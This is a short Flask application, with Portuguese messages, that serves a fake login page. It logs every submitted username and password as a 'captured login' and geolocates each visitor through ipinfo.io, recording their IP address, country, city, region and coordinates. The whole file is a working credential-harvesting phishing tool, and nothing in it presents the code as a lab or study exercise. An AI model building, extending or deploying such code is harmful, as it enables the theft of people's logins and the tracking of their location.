from os import urandom
import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)
app.secret_key = urandom(16)


@app.route("/")
def index():
    """
    Renders the index.html template.

    Returns:
        The rendered index.html template.
    """
    return render_template("index.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    """
    A decorator to specify the route for the login page and the logic for handling GET and POST requests.
    """
    ip = request.remote_addr
    response = requests.get(f"https://ipinfo.io/{ip}/json")
    data = response.json()
    pais = data.get("country")
    cidade = data.get("city")
    regiao = data.get("region")
    loc = data.get("loc")

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        print(f"\n\nLogin Capturado: \nUsername: {username}\nPassword: {password}\n")

        print(f"O endereço IP do usuário é: {ip}")
        print(f"O pais do usuário é: {pais}")
        print(f"A cidade do usuario é: {cidade}")
        print(f"A regiao do ususario é {regiao}")
        print(f"A loc do ususario é {loc}")
        print("\n")

        return redirect("dashboard")

    return render_template("login.html")


@app.route("/dashboard")
def dashboard():
    """
    A route for the dashboard that renders the dashboard.html template.
    """
    return render_template("dashboard.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
